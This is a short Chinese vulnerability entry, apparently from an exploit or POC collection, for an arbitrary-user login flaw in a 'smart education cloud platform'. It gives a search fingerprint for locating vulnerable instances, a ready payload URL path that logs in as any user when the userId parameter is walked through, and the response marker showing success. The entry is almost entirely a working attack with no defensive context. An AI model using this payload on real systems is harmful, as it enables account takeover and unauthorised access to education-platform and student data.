# 智慧教育云平台userId任意用户登录漏洞

智慧教育云平台userId任意用户登录 ｜ 其他 ｜ —
- **指纹**：`body="/Content/backend/css/hwui/hwui.css"`

**Payload**
```
/Account/LoginUserPersonType?userId=1 可遍历userId登录任意用户
```
- **响应特征**：200 true